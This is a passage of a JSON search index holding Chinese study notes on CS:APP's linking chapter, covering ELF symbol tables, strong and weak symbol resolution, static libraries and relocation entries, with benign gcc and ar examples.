\u200b\u5f15\u7528\u200b\u7684\u200b \u200b\u5168\u5c40\u200b\u7b26\u53f7\u200b, \u200b\u88ab\u200b\u79f0\u4e3a\u200b \u200b\u5916\u90e8\u200b\u7b26\u53f7\u200b, \u200b\u5bf9\u5e94\u200b\u4e8e\u200b\u5176\u4ed6\u200b\u6a21\u5757\u200b\u5b9a\u4e49\u200b\u7684\u200b\u975e\u200b\u9759\u6001\u200b C \u200b\u51fd\u6570\u200b\u548c\u200b\u5168\u5c40\u53d8\u91cf\u200b - \u200b\u53ea\u200b\u88ab\u200b m \u200b\u5b9a\u4e49\u200b\u548c\u200b\u5f15\u7528\u200b\u7684\u200b \u200b\u5c40\u90e8\u200b\u7b26\u53f7\u200b, \u200b\u5bf9\u5e94\u200b\u4e8e\u200b\u5e26\u200b static \u200b\u5c5e\u6027\u200b\u7684\u200b C \u200b\u51fd\u6570\u200b\u548c\u200b\u53d8\u91cf\u200b.</p> <p>Note</p> <p>\u200b\u4e0d\u540c\u200b\u7684\u200b\u4f5c\u7528\u57df\u200b\u4e2d\u200b\u53ef\u4ee5\u200b\u5b9a\u4e49\u200b\u76f8\u540c\u200b\u540d\u5b57\u200b\u7684\u200b static \u200b\u5c40\u90e8\u53d8\u91cf\u200b, \u200b\u7f16\u8bd1\u5668\u200b\u4f1a\u200b\u7ed9\u200b\u4ed6\u4eec\u200b\u5206\u914d\u200b\u4e0d\u540c\u200b\u7684\u200b\u540d\u5b57\u200b. </p> <p>.symtab \u200b\u8282\u200b\u5305\u542b\u200b ELF \u200b\u7b26\u53f7\u8868\u200b, \u200b\u7b26\u53f7\u8868\u200b\u5305\u542b\u200b\u4e00\u4e2a\u200b\u6570\u7ec4\u200b, \u200b\u6570\u7ec4\u200b\u7684\u200b\u6bcf\u4e2a\u200b\u5143\u7d20\u200b\u662f\u200b\u4e00\u4e2a\u200b\u6761\u76ee\u200b, \u200b\u6761\u76ee\u200b\u683c\u5f0f\u200b\u5982\u4e0b\u200b: C<pre><code>typedef struct {\n    int name;\n    char type:4, // \u200b\u4f4e\u200b 4 \u200b\u4f4d\u200b\n         binding:4; // \u200b\u9ad8\u200b 4 \u200b\u4f4d\u200b\n    char reserved; // \u200b\u53ef\u80fd\u200b\u662f\u200b\u7528\u4e8e\u200b\u5bf9\u9f50\u200b\n    short section;\n    long value;\n    long size;\n} ELF64_Symbol;\n</code></pre></p> <ul> <li>name: \u200b\u5b57\u7b26\u4e32\u200b\u8868\u200b(.strtab)\u200b\u4e2d\u200b\u7684\u200b\u5b57\u8282\u200b\u504f\u79fb\u200b, \u200b\u6307\u5411\u200b\u4e00\u4e2a\u200b\u5b57\u7b26\u4e32\u200b\u540d\u5b57\u200b. (.strtab \u200b\u4e2d\u662f\u200b\u4e00\u4e2a\u4e2a\u200b\u4ee5\u200b null \u200b\u7ed3\u5c3e\u200b\u7684\u200b\u5b57\u7b26\u4e32\u200b, \u200b\u901a\u8fc7\u200b\u504f\u79fb\u91cf\u200b\u4e00\u76f4\u200b\u627e\u200b\u76f4\u5230\u200b\u9047\u5230\u200b '\\0' \u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u786e\u5b9a\u200b\u552f\u4e00\u200b\u4e00\u4e2a\u200b\u7b26\u53f7\u200b\u540d\u5b57\u200b)</li> <li>value: \u200b\u7b26\u53f7\u200b\u5730\u5740\u200b(\u200b\u4e0d\u662f\u200b\u7b26\u53f7\u200b\u7684\u200b\u503c\u200b), \u200b\u53ef\u91cd\u200b\u5b9a\u4f4d\u200b\u6a21\u5757\u200b\u4e2d\u662f\u200b\u8ddd\u200b\u5b9a\u4e49\u200b\u76ee\u6807\u200b\u7684\u200b\u8282\u200b\u7684\u200b\u8d77\u59cb\u200b\u4f4d\u7f6e\u200b\u7684\u200b\u504f\u79fb\u200b, \u200b\u5bf9\u200b\u53ef\u200b\u6267\u884c\u200b\u6a21\u5757\u200b\u5c31\u662f\u200b\u7edd\u5bf9\u200b\u5730\u5740\u200b\u4e86\u200b. (\u200b\u5728\u200b\u94fe\u63a5\u200b\u65f6\u200b\u5206\u914d\u200b\u865a\u62df\u5730\u5740\u200b)</li> <li>size: \u200b\u76ee\u6807\u200b\u7684\u200b\u5927\u5c0f\u200b, \u200b\u4ee5\u200b\u5b57\u8282\u200b\u4e3a\u200b\u5355\u4f4d\u200b. \u200b\u4f8b\u5982\u200b\u5bf9\u4e8e\u200b\u4ee3\u7801\u200b\u5c31\u662f\u200b\u4ee3\u7801\u200b\u7684\u200b\u5927\u5c0f\u200b</li> <li>type: \u200b\u8981\u4e48\u200b\u662f\u200b\u6570\u636e\u200b, \u200b\u8981\u4e48\u200b\u662f\u200b\u51fd\u6570\u200b</li> <li>binding: \u200b\u7b26\u53f7\u200b\u662f\u200b\u672c\u5730\u200b\u7684\u200b(\u200b\u53ea\u200b\u5728\u200b\u5f53\u524d\u200b\u6a21\u5757\u200b\u53ef\u89c1\u200b)\u200b\u8fd8\u662f\u200b\u5168\u5c40\u200b\u7684\u200b(\u200b\u522b\u7684\u200b\u6a21\u5757\u200b\u4e5f\u200b\u53ef\u89c1\u200b)</li> <li>section: \u200b\u8868\u793a\u200b\u7b26\u53f7\u200b\u5206\u914d\u200b\u5230\u200b\u7684\u200b\u8282\u200b\u7684\u200b\u7d22\u5f15\u200b(Ndx=1\u200b\u4ee3\u8868\u200b.text, Ndx=3 \u200b\u4ee3\u8868\u200b.data). \u200b\u6709\u200b\u4e09\u4e2a\u200b\u7279\u6b8a\u200b\u7684\u200b\u4f2a\u8282\u200b, \u200b\u5b83\u4eec\u200b\u5728\u200b\u8282\u200b\u5934\u90e8\u200b\u8868\u662f\u200b\u6ca1\u6709\u200b\u6761\u200b\u76ee\u7684\u200b:<ul> <li>ABS: \u200b\u4ee3\u8868\u200b\u4e0d\u8be5\u200b\u88ab\u200b\u91cd\u200b\u5b9a\u4f4d\u200b\u7684\u200b\u7b26\u53f7\u200b(\u200b\u53ef\u80fd\u200b\u662f\u200b\u4e00\u4e9b\u200b\u6c47\u7f16\u5668\u200b\u4ea7\u751f\u200b\u7684\u200b\u5e38\u91cf\u200b\u6570\u636e\u200b)</li> <li>UNDEF: \u200b\u672a\u5b9a\u4e49\u200b\u7684\u200b\u7b26\u53f7\u200b, \u200b\u5728\u200b\u672c\u200b\u76ee\u6807\u200b\u6a21\u5757\u200b\u5f15\u7528\u200b\u5374\u200b\u5728\u200b\u5176\u4ed6\u200b\u5730\u65b9\u200b\u5b9a\u4e49\u200b\u7684\u200b\u7b26\u53f7\u200b (extern)</li> <li>COMMON: \u200b\u8fd8\u200b\u672a\u200b\u5206\u914d\u200b\u4f4d\u7f6e\u200b\u7684\u200b\u672a\u200b\u521d\u59cb\u5316\u200b\u7684\u200b\u6570\u636e\u200b\u76ee\u6807\u200b, \u200b\u5bf9\u4e8e\u200b COMMON\u200b\u7b26\u53f7\u200b, value \u200b\u7ed9\u51fa\u200b\u7684\u200b\u662f\u200b\u5bf9\u9f50\u200b\u8981\u6c42\u200b(\u200b\u56e0\u4e3a\u200b\u5b83\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u5730\u5740\u200b), size \u200b\u7ed9\u51fa\u200b\u6700\u5c0f\u200b\u7684\u200b\u5927\u5c0f\u200b.</li> <li>gcc \u200b\u5c06\u200b\u672a\u200b\u521d\u59cb\u5316\u200b\u7684\u200b\u5168\u5c40\u53d8\u91cf\u200b\u5206\u914d\u200b\u5230\u200b COMMON \u200b\u8282\u200b, \u200b\u672a\u200b\u521d\u59cb\u5316\u200b\u7684\u200b\u9759\u6001\u200b\u53d8\u91cf\u200b, \u200b\u521d\u59cb\u5316\u200b\u4e3a\u200b 0 \u200b\u7684\u200b\u5168\u5c40\u200b\u6216\u200b\u9759\u6001\u200b\u53d8\u91cf\u200b\u5206\u200b\u5230\u200b .bss \u200b\u8282\u200b. \u200b\u8fd9\u662f\u200b\u6839\u636e\u200b\u7b26\u53f7\u200b\u7684\u200b\u5f3a\u5f31\u200b\u533a\u5206\u200b\u7684\u200b. (\u200b\u7406\u89e3\u200b\u4e0a\u200b\u5c31\u662f\u8bf4\u200b\u672a\u200b\u521d\u59cb\u5316\u200b\u7684\u200b\u5168\u5c40\u53d8\u91cf\u200b\u4f60\u200b\u4e0d\u200b\u77e5\u9053\u200b\u5b83\u200b\u662f\u4e0d\u662f\u200b\u5916\u90e8\u200b\u6709\u200b\u5b9a\u4e49\u200b)</li> </ul> </li> </ul> <p>COMMON \u200b\u7b26\u53f7\u200b\u7684\u200b\u5730\u5740\u200b\u786e\u5b9a\u200b</p> <p>\u200b\u9996\u5148\u200b\u6839\u636e\u200b\u5f3a\u5f31\u200b\u7b26\u53f7\u200b\u7684\u200b\u89c4\u5219\u200b\u4fdd\u7559\u200b\u4e00\u4e2a\u200b\u7b26\u53f7\u200b, \u200b\u5982\u679c\u200b\u522b\u7684\u200b\u6587\u4ef6\u200b\u6709\u5f3a\u200b\u7b26\u53f7\u200b\u5b9a\u4e49\u200b, \u200b\u90a3\u4e48\u200b\u76f4\u63a5\u200b\u66ff\u6362\u200b\u4e3a\u5f3a\u200b\u7b26\u53f7\u200b. \u200b\u5982\u679c\u200b\u90fd\u200b\u662f\u200b\u5f31\u200b\u7b26\u53f7\u200b\u968f\u673a\u200b\u4fdd\u7559\u200b\u4e00\u4e2a\u200b\u5e76\u200b\u521b\u5efa\u200b\u6216\u200b\u6269\u5c55\u200b .bss \u200b\u8282\u200b</p> <p>UNDEF \u200b\u7b26\u53f7\u200b</p> <p>UNDEF \u200b\u7b26\u53f7\u200b\u662f\u200b\u7c7b\u4f3c\u200b extern int x; \u200b\u7684\u200b\u7b26\u53f7\u200b, \u200b\u5b83\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b\u5916\u90e8\u200b\u7b26\u53f7\u200b\u7684\u200b\u5b9a\u4e49\u200b, \u200b\u6240\u4ee5\u200b\u4e0d\u7528\u200b\u5206\u914d\u200b\u5730\u5740\u200b, value = 0, \u200b\u5728\u200b\u94fe\u63a5\u200b\u7684\u200b\u65f6\u5019\u200b\u628a\u200b\u4ee3\u7801\u200b\u91cc\u200b\u7528\u5230\u200b x \u200b\u7684\u200b\u5730\u65b9\u200b\u91cd\u200b\u5b9a\u4f4d\u200b\u5373\u53ef\u200b.</p>"},{"location":"notes/ICS/Chapter%2007%20Linking/#76","title":"7.6 \u200b\u7b26\u53f7\u200b\u89e3\u6790","text":""},{"location":"notes/ICS/Chapter%2007%20Linking/#761","title":"7.6.1 \u200b\u94fe\u63a5\u200b\u5668\u200b\u5982\u4f55\u200b\u89e3\u6790\u200b\u591a\u91cd\u200b\u5b9a\u4e49\u200b\u7684\u200b\u5168\u5c40\u200b\u7b26\u53f7","text":"<p>\u200b\u5f3a\u200b\u7b26\u53f7\u200b: \u200b\u51fd\u6570\u200b\u548c\u200b\u5df2\u200b\u521d\u59cb\u5316\u200b\u7684\u200b\u5168\u5c40\u53d8\u91cf\u200b</p> <p>\u200b\u5f31\u200b\u7b26\u53f7\u200b: \u200b\u672a\u200b\u521d\u59cb\u5316\u200b\u7684\u200b\u5168\u5c40\u53d8\u91cf\u200b</p> <p>Linux \u200b\u9075\u5faa\u200b\u4ee5\u4e0b\u200b\u89c4\u5219\u200b\u5904\u7406\u200b\u591a\u91cd\u200b\u5b9a\u4e49\u200b\u7b26\u53f7\u200b\u540d\u200b: - \u200b\u4e0d\u200b\u5141\u8bb8\u200b\u591a\u4e2a\u200b\u540c\u540d\u200b\u5f3a\u200b\u7b26\u53f7\u200b - \u200b\u4e00\u4e2a\u200b\u5f3a\u200b\u7b26\u53f7\u200b\u548c\u200b\u591a\u4e2a\u200b\u5f31\u200b\u7b26\u53f7\u200b, \u200b\u9009\u62e9\u200b\u5f3a\u200b\u7b26\u53f7\u200b - \u200b\u591a\u4e2a\u200b\u5f31\u200b\u7b26\u53f7\u200b, \u200b\u4efb\u610f\u200b\u9009\u62e9\u200b\u4e00\u4e2a\u200b</p> <p>\u200b\u7531\u4e8e\u200b\u8fd9\u79cd\u200b\u89c4\u5219\u200b, \u200b\u5982\u679c\u200b\u4f7f\u7528\u200b\u4e0d\u540c\u200b\u7c7b\u578b\u5b9a\u4e49\u200b\u540c\u540d\u200b\u53d8\u91cf\u200b, \u200b\u5f88\u200b\u5bb9\u6613\u200b\u53d1\u751f\u200b\u610f\u60f3\u4e0d\u5230\u200b\u7684\u200b\u9519\u8bef\u200b, \u200b\u4f8b\u5982\u200b:</p> <p>1.c C<pre><code>int x = 15212;\nint y = 15213;\n</code></pre></p> <p>2.c C<pre><code>double x;\nvoid f() {\n    x = -0.0;\n}\n</code></pre></p> <p>\u200b\u8fd9\u91cc\u200b 2.c \u200b\u7684\u200b x \u200b\u4f1a\u200b\u4f7f\u7528\u200b 1.c \u200b\u7684\u200b\u5b9a\u4e49\u200b, \u200b\u4f46\u662f\u200b\u7531\u4e8e\u200b double \u200b\u662f\u200b 8 \u200b\u5b57\u8282\u200b, \u200b\u6240\u4ee5\u200b\u5728\u200b\u8c03\u7528\u200b f() \u200b\u7684\u200b\u65f6\u5019\u200b\u4f1a\u200b\u628a\u200b\u7d27\u90bb\u200b 4 \u200b\u5b57\u8282\u200b\u7684\u200b y \u200b\u7684\u200b\u503c\u200b\u4e5f\u200b\u4fee\u6539\u200b\u4e86\u200b.</p>"},{"location":"notes/ICS/Chapter%2007%20Linking/#762","title":"7.6.2 \u200b\u4e0e\u200b\u9759\u6001\u200b\u5e93\u200b\u94fe\u63a5","text":"<p>\u200b\u9759\u6001\u200b\u5e93\u662f\u200b\u4e3a\u4e86\u200b\u89e3\u51b3\u200b\u8c03\u7528\u200b\u4e00\u4e9b\u200b\u6807\u51c6\u200b\u51fd\u6570\u200b\u7684\u200b\u5f15\u7528\u200b\u95ee\u9898\u200b\u63d0\u51fa\u200b\u7684\u200b.</p> <p>\u200b\u76f8\u5173\u200b\u7684\u200b\u51fd\u6570\u200b\u53ef\u4ee5\u200b\u88ab\u200b\u7f16\u8bd1\u200b\u4e3a\u200b\u72ec\u7acb\u200b\u7684\u200b\u76ee\u6807\u200b\u6a21\u5757\u200b, \u200b\u7136\u540e\u200b\u5c01\u88c5\u200b\u6210\u200b\u4e00\u4e2a\u200b\u5355\u72ec\u200b\u7684\u200b\u9759\u6001\u200b\u5e93\u200b\u6587\u4ef6\u200b. \u200b\u5728\u200b\u94fe\u63a5\u200b\u65f6\u200b\u53ea\u200b\u590d\u5236\u200b\u88ab\u200b\u5f15\u7528\u200b\u7684\u200b\u76ee\u6807\u200b\u6a21\u5757\u200b, \u200b\u8fd9\u6837\u200b\u5c31\u200b\u51cf\u5c11\u200b\u4e86\u200b\u53ef\u6267\u884c\u6587\u4ef6\u200b\u7684\u200b\u5927\u5c0f\u200b.</p> <p>Liunx \u200b\u4e2d\u200b\u9759\u6001\u200b\u5e93\u4ee5\u200b archive \u200b\u7684\u200b\u6587\u4ef6\u683c\u5f0f\u200b\u5b58\u653e\u200b\u5728\u200b\u78c1\u76d8\u200b\u4e2d\u200b (.a)</p> <p>\u200b\u4f8b\u5982\u200b\u6709\u200b addvec.c \u200b\u548c\u200b multvec.c \u200b\u4e24\u4e2a\u200b\u6587\u4ef6\u200b</p> Bash<pre><code>&gt; gcc -c addvec.c multvec.c # \u200b\u53ea\u200b\u6267\u884c\u200b\u5230\u200b\u6c47\u7f16\u200b, \u200b\u4e0d\u200b\u94fe\u63a5\u200b\n&gt; ar rcs libvector.a addvec.o multvec.o\n</code></pre> <p>\u200b\u8fd9\u6837\u200b\u5c31\u200b\u521b\u5efa\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u9759\u6001\u200b\u5e93\u200b.</p> <p>main.c \u200b\u4e0e\u5176\u200b\u94fe\u63a5\u200b\u7684\u200b\u65f6\u5019\u200b, \u200b\u4f7f\u7528\u200b\u547d\u4ee4\u200b</p> Bash<pre><code>&gt; gcc -c main.c\n&gt; gcc -static -o prog main.o ./libvector.a\n&gt; \u200b\u6216\u8005\u200b\n&gt; gcc -static -o prog main.o -L. -lvector\n</code></pre> <p>-lvector \u200b\u662f\u200b libvector.a \u200b\u7684\u200b\u7f29\u5199\u200b. -L. \u200b\u544a\u8bc9\u200b\u7f16\u8bd1\u5668\u200b\u5728\u200b\u5f53\u524d\u76ee\u5f55\u200b\u4e0b\u200b\u67e5\u627e\u200b libvector.a.</p>"},{"location":"notes/ICS/Chapter%2007%20Linking/#763","title":"7.6.3 \u200b\u94fe\u63a5\u200b\u5668\u200b\u5982\u4f55\u200b\u4f7f\u7528\u200b\u9759\u6001\u200b\u5e93\u200b\u89e3\u6790\u200b\u5f15\u7528","text":"<p>\u200b\u5728\u200b\u7b26\u53f7\u200b\u89e3\u6790\u200b\u9636\u6bb5\u200b, \u200b\u94fe\u63a5\u200b\u5668\u200b\u4ece\u5de6\u5230\u53f3\u200b\u6309\u7167\u200b\u5b83\u4eec\u200b\u5728\u200b\u547d\u4ee4\u884c\u200b\u51fa\u73b0\u200b\u7684\u200b\u987a\u5e8f\u200b\u626b\u63cf\u200b\u53ef\u91cd\u200b\u5b9a\u4f4d\u200b\u76ee\u6807\u200b\u6587\u4ef6\u200b\u548c\u200b\u5b58\u6863\u200b\u6587\u4ef6\u200b. \u200b\u7ef4\u62a4\u200b\u4e09\u4e2a\u200b\u96c6\u5408\u200b E, U, D.</p> <ul> <li>E: \u200b\u53ef\u91cd\u200b\u5b9a\u4f4d\u200b\u76ee\u6807\u200b\u6587\u4ef6\u200b\u96c6\u5408\u200b</li> <li>U: \u200b\u5f15\u7528\u200b\u4e86\u200b\u4f46\u200b\u672a\u5b9a\u4e49\u200b\u7684\u200b\u7b26\u53f7\u200b\u96c6\u5408\u200b</li> <li>D: \u200b\u5728\u200b\u524d\u9762\u200b\u6587\u4ef6\u200b\u5df2\u200b\u5b9a\u4e49\u200b\u7684\u200b\u7b26\u53f7\u200b\u96c6\u5408\u200b</li> </ul> <p>\u200b\u4e4b\u540e\u200b\u5bf9\u4e8e\u200b\u6bcf\u4e2a\u200b\u8f93\u5165\u200b\u6587\u4ef6\u200b f - \u200b\u5982\u679c\u200b f \u200b\u662f\u200b\u53ef\u91cd\u200b\u5b9a\u4f4d\u200b\u76ee\u6807\u200b\u6587\u4ef6\u200b, \u200b\u5c31\u200b\u52a0\u5165\u200b E, \u200b\u7136\u540e\u200b\u6839\u636e\u200b f \u200b\u4fee\u6539\u200b U \u200b\u548c\u200b D. - \u200b\u5982\u679c\u200b f \u200b\u662f\u200b\u5b58\u6863\u200b\u6587\u4ef6\u200b, \u200b\u5c1d\u8bd5\u200b\u5339\u914d\u200b U \u200b\u4e2d\u200b\u672a\u5b9a\u4e49\u200b\u7684\u200b\u7b26\u53f7\u200b, \u200b\u5982\u679c\u200b\u67d0\u4e2a\u200b\u5b58\u6863\u200b\u6587\u4ef6\u200b\u6210\u5458\u200b m (\u200b\u8fd9\u662f\u200b\u4e00\u4e2a\u200b\u53ef\u91cd\u200b\u5b9a\u4f4d\u200b\u76ee\u6807\u200b\u6587\u4ef6\u200b) \u200b\u5b9a\u4e49\u200b\u4e86\u200b\u8fd9\u4e2a\u200b\u7b26\u53f7\u200b, \u200b\u5c31\u200b\u5c06\u200b m \u200b\u52a0\u5165\u200b\u5230\u200b E \u200b\u4e2d\u200b, \u200b\u6839\u636e\u200b m \u200b\u4fee\u6539\u200b U \u200b\u548c\u200b D, \u200b\u5bf9\u200b\u5b58\u6863\u200b\u6587\u4ef6\u200b\u6240\u6709\u200b\u76ee\u6807\u200b\u6587\u4ef6\u200b\u4f9d\u6b21\u200b\u6267\u884c\u200b\u8fd9\u4e00\u200b\u8fc7\u7a0b\u200b, \u200b\u76f4\u5230\u200b U, D \u200b\u4e0d\u518d\u200b\u53d8\u5316\u200b, \u200b\u6b64\u65f6\u200b\u4e0d\u200b\u5305\u542b\u200b\u5728\u200b E \u200b\u7684\u200b\u6587\u4ef6\u200b\u88ab\u200b\u4e22\u5f03\u200b.</p> <p>\u200b\u56e0\u6b64\u200b, \u200b\u6587\u4ef6\u200b\u7684\u200b\u8f93\u5165\u200b\u987a\u5e8f\u200b\u975e\u5e38\u200b\u91cd\u8981\u200b, \u200b\u5982\u679c\u200b\u4e00\u4e2a\u200b\u672a\u200b\u5f15\u7528\u200b\u7684\u200b\u7b26\u53f7\u200b\u7684\u200b\u5b9a\u4e49\u200b\u6587\u4ef6\u200b\u5728\u200b\u5b83\u200b\u4e4b\u524d\u200b, \u200b\u90a3\u4e48\u200b\u5b83\u200b\u5c31\u200b\u65e0\u6cd5\u200b\u83b7\u53d6\u200b\u5b83\u200b\u7684\u200b\u5b9a\u4e49\u200b.</p>"},{"location":"notes/ICS/Chapter%2007%20Linking/#77","title":"7.7 \u200b\u91cd\u200b\u5b9a\u4f4d","text":"<p>\u200b\u4e00\u65e6\u200b\u94fe\u63a5\u200b\u5668\u200b\u5b8c\u6210\u200b\u4e86\u200b\u7b26\u53f7\u200b\u89e3\u6790\u200b, \u200b\u6bcf\u4e2a\u200b\u7b26\u53f7\u200b\u5f15\u7528\u200b\u548c\u200b\u4e00\u4e2a\u200b\u5b9a\u4e49\u200b\u5173\u8054\u200b\u8d77\u6765\u200b, \u200b\u94fe\u63a5\u200b\u5668\u200b\u5c31\u200b\u77e5\u9053\u200b\u4e86\u200b\u5b83\u200b\u76ee\u6807\u200b\u6a21\u5757\u200b\u7684\u200b\u4ee3\u7801\u200b\u8282\u200b\u548c\u200b\u6570\u636e\u200b\u8282\u200b\u7684\u200b\u786e\u5207\u200b\u5927\u5c0f\u200b. \u200b\u73b0\u5728\u200b\u53ef\u4ee5\u200b\u5f00\u59cb\u200b\u91cd\u200b\u5b9a\u4f4d\u200b\u4e86\u200b.</p> <p>\u200b\u91cd\u200b\u5b9a\u4f4d\u200b\u7531\u200b\u4e24\u6b65\u200b\u7ec4\u6210\u200b: - \u200b\u91cd\u200b\u5b9a\u4f4d\u200b\u8282\u200b\u548c\u200b\u7b26\u53f7\u200b\u5b9a\u4e49\u200b\u3002\u200b\u5728\u200b\u8fd9\u200b\u4e00\u6b65\u200b\u4e2d\u200b\uff0c\u200b\u94fe\u63a5\u200b\u5668\u200b\u5c06\u200b\u6240\u6709\u200b\u76f8\u540c\u200b\u7c7b\u578b\u200b\u7684\u200b\u8282\u200b\u5408\u5e76\u200b\u4e3a\u200b\u540c\u4e00\u200b\u7c7b\u578b\u200b\u7684\u200b\u65b0\u200b\u7684\u200b\u805a\u5408\u200b\u8282\u200b\u3002\u200b\u4f8b\u5982\u200b\uff0c\u200b\u6765\u81ea\u200b\u6240\u6709\u200b\u8f93\u5165\u200b\u6a21\u5757\u200b\u7684\u200b.data\u200b\u8282\u200b\u88ab\u200b\u5168\u90e8\u200b\u5408\u5e76\u200b\u6210\u200b\u4e00\u4e2a\u200b\u8282\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u8282\u200b\u6210\u4e3a\u200b\u8f93\u51fa\u200b\u7684\u200b\u53ef\u200b\u6267\u884c\u200b\u76ee\u6807\u200b\u6587\u4ef6\u200b\u7684\u200b.data\u200b\u8282\u200b\u3002\u200b\u7136\u540e\u200b\uff0c\u200b\u94fe\u63a5\u200b\u5668\u200b\u5c06\u200b\u8fd0\u884c\u200b\u65f6\u200b\u5185\u5b58\u5730\u5740\u200b\u8d4b\u7ed9\u200b\u65b0\u200b\u7684\u200b\u805a\u5408\u200b\u8282\u200b\uff0c\u200b\u8d4b\u7ed9\u200b\u8f93\u5165\u200b\u6a21\u5757\u200b\u5b9a\u4e49\u200b\u7684\u200b\u6bcf\u4e2a\u200b\u8282\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u8d4b\u7ed9\u200b\u8f93\u4eba\u200b\u6a21\u5757\u200b\u5b9a\u4e49\u200b\u7684\u200b\u6bcf\u4e2a\u200b\u7b26\u53f7\u200b\u3002\u200b\u5f53\u200b\u8fd9\u200b\u4e00\u6b65\u200b\u5b8c\u6210\u200b\u65f6\u200b\uff0c\u200b\u7a0b\u5e8f\u200b\u4e2d\u200b\u7684\u200b\u6bcf\u6761\u200b\u6307\u4ee4\u200b\u548c\u200b\u5168\u5c40\u53d8\u91cf\u200b\u90fd\u200b\u6709\u200b\u552f\u4e00\u200b\u7684\u200b\u8fd0\u884c\u200b\u65f6\u200b\u5185\u5b58\u5730\u5740\u200b\u4e86\u200b\u3002 - \u200b\u91cd\u200b\u5b9a\u4f4d\u200b\u8282\u4e2d\u200b\u7684\u200b\u7b26\u53f7\u200b\u5f15\u7528\u200b\u3002\u200b\u5728\u200b\u8fd9\u200b\u4e00\u6b65\u200b\u4e2d\u200b\uff0c\u200b\u94fe\u63a5\u200b\u5668\u200b\u4fee\u6539\u200b\u4ee3\u7801\u200b\u8282\u200b\u548c\u200b\u6570\u636e\u200b\u8282\u4e2d\u200b\u5bf9\u200b\u6bcf\u4e2a\u200b\u7b26\u53f7\u200b\u7684\u200b\u5f15\u7528\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u5b83\u4eec\u200b\u6307\u5411\u200b\u6b63\u786e\u200b\u7684\u200b\u8fd0\u884c\u200b\u65f6\u200b\u5730\u5740\u200b\u3002\u200b\u8981\u200b\u6267\u884c\u200b\u8fd9\u200b\u4e00\u6b65\u200b\uff0c\u200b\u94fe\u63a5\u200b\u5668\u200b\u4f9d\u8d56\u4e8e\u200b\u53ef\u91cd\u200b\u5b9a\u4f4d\u200b\u76ee\u6807\u200b\u6a21\u5757\u200b\u4e2d\u200b\u79f0\u4e3a\u200b\u91cd\u200b\u5b9a\u4f4d\u200b\u6761\u76ee\u200b(relocationentry)\u200b\u7684\u200b\u6570\u636e\u7ed3\u6784\u200b\uff0c\u200b\u6211\u4eec\u200b\u63a5\u4e0b\u6765\u200b\u5c06\u4f1a\u200b\u63cf\u8ff0\u200b\u8fd9\u79cd\u200b\u6570\u636e\u7ed3\u6784\u200b\u3002</p>"},{"location":"notes/ICS/Chapter%2007%20Linking/#771","title":"7.7.1 \u200b\u91cd\u200b\u5b9a\u4f4d\u200b\u6761\u76ee","text":"<p>\u200b\u683c\u5f0f\u200b: C<pre><code>typedef struct {\n    long offset;\n    long type: 32,\n         symbol: 32;\n    long addend;\n} Elf64_Rela;\n</code></pre> - offset: \u200b\u8981\u91cd\u200b\u5b9a\u4f4d\u200b\u7684\u200b\u7b26\u53f7\u200b\u5728\u200b\u5b83\u200b\u90a3\u4e2a\u200b\u8282\u200b\u7684\u200b\u504f\u79fb\u200b - type: \u200b\u5982\u4f55\u200b\u4fee\u6539\u200b\u5f15\u7528\u200b - symbol: \u200b\u88ab\u200b\u4fee\u6539\u200b\u5f15\u7528\u200b\u5e94\u8be5\u200b\u6307\u5411\u200b\u7684\u200b\u7b26\u53f7\u200b\u5728\u200b\u7b26\u53f7\u8868\u200b\u7684\u200b\u7d22\u5f15\u200b(\u200b\u6ce8\u610f\u200b\u6211\u4eec\u200b\u5df2\u7ecf\u200b\u4e3a\u200b\u8fd9\u4e9b\u200b\u53d8\u91cf\u200b\u5206\u914d\u200b\u4e86\u200b\u7edd\u5bf9\u200b\u5730\u5740\u200b, \u200b\u6240\u4ee5\u200b\u53ef\u4ee5\u200b\u5728\u200b\u7b26\u53f7\u8868\u200b\u4e2d\u200b\u627e\u200b\u5730\u5740\u200b) - addend: \u200b\u504f\u79fb\u91cf\u200b</p> <p>\u200b\u4e24\u79cd\u200b\u5178\u578b\u200b\u91cd\u200b\u5b9a\u4f4d\u200b\u7c7b\u578b\u200b: - R_X86_64_PC32: PC\u200b\u76f8\u5bf9\u200b\u5bfb\u5740\u200b - R_X86_64_32: \u200b\u7edd\u5bf9\u200b\u5bfb\u5740\u200b</p>"},{"location":"notes/ICS/Chapter%2007%20Linking/#772","title":"7.7.2 \u200b\u91cd\u200b\u5b9a\u4f4d\u200b\u7b26\u53f7\u200b\u5f15\u7528","text":"<p>\u200b\u611f\u89c9\u200b\u4e66\u4e0a\u200b\u8bb2\u200b\u7684\u200b\u592a\u200b\u590d\u6742\u200b, \u200b\u7528\u200b\u4e00\u822c\u200b\u7684\u200b\u76f8\u5bf9\u200b\u5bfb\u5740\u200b\u65b9\u5f0f\u200b\u6765\u200b\u7406\u89e3\u200b\u5373\u53ef\u200b.</p>"},{"location":"notes/ICS/Chapter%2007%20Linking/#78","title":"7.8 \u200b\u53ef\u200b\u6267\u884c\u200b\u76ee\u6807\u200b\u6587\u4ef6","text":"<ul> <li>ELF \u200b\u5934\u200b: \u200b\u63cf\u8ff0\u200b\u6587\u4ef6\u200b\u603b\u4f53\u200b\u683c\u5f0f\u200b, \u200b\u5305\u62ec\u200b\u7a0b\u5e8f\u200b\u5165\u53e3\u200b\u70b9\u200b(\u200b\u7b2c\u4e00\u6761\u200b\u6307\u4ee4\u200b\u5730\u5740\u200b)</li> <li>.text, .rodata, .data \u200b\u7b49\u200b\u7c7b\u4f3c\u200b</li> <li>.init \u200b\u5b9a\u4e49\u200b\u4e86\u200b _init_ \u200b\u51fd\u6570\u200b, \u200b\u7a0b\u5e8f\u200b\u521d\u59cb\u5316\u200b\u4ee3\u7801\u200b(__libc_start_main)\u200b\u4f1a\u200b\u8c03\u7528\u200b\u5b83\u200b</li> </ul> <p>BSS \u200b\u6bb5\u200b\u7684\u200b\u7a7a\u95f4\u200b\u5206\u914d\u200b</p> <p>\u200b\u53ef\u200b\u6267\u884c\u200b\u76ee\u6807\u200b\u6587\u4ef6\u200b\u4e0d\u4f1a\u200b\u4e3a\u200b .bss \u200b\u5206\u914d\u200b\u5b9e\u9645\u200b\u7684\u200b\u7a7a\u95f4\u200b, .bss 